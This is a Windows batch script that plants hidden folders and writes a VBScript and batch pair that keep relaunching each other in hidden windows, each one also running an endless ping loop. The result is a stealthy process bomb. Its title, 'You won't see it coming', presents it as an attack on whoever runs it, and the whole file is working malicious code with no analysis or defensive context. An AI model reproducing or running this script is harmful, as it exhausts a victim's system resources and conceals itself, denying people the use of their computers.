@echo off

title You won't see it coming

mkdir C:\WindowsFire

attrib +h C:\WindowsFire

echo Set WshShell = WScript.CreateObject ("WScript.Shell") >> C:\WindowsFire\fire.vbs

echo WshShell.Run ("PinguinGen.bat") >> C:\WindowsFire\fire.vbs

echo @echo off >> C:\WindowsFire\PinguinGen.bat

echo mkdir C:\Pinguin >> C:\WindowsFire\PinguinGen.bat

echo attrib +h C:\Pinguin >> C:\WindowsFire\PinguinGen.bat

echo ^echo @echo off ^>^> C:\Pinguin\Pinguin.bat >> C:\WindowsFire\PinguinGen.bat

echo ^echo :0 ^>^> C:\Pinguin\Pinguin.bat >> C:\WindowsFire\PinguinGen.bat

echo ^echo start C:\Pinguin\pind.vbs ^>^> C:\Pinguin\Pinguin.bat >> C:\WindowsFire\PinguinGen.bat

echo ^echo ping 127.0.0.1 -t ^>^> C:\Pinguin\Pinguin.bat >> C:\WindowsFire\PinguinGen.bat

echo ^echo goto 0: ^>^> C:\Pinguin\Pinguin.bat >> C:\WindowsFire\PinguinGen.bat

echo ^echo CreateObject("Wscript.shell").Run "C:\Pinguin\Pinguin.bat", 0, True ^>^> C:\Pinguin\pind.vbs >> C:\WindowsFire\PinguinGen.bat

echo start C:\Pinguin\pind.vbs >> C:\WindowsFire\PinguinGen.bat

start C:\WindowsFire\fire.vbs

exit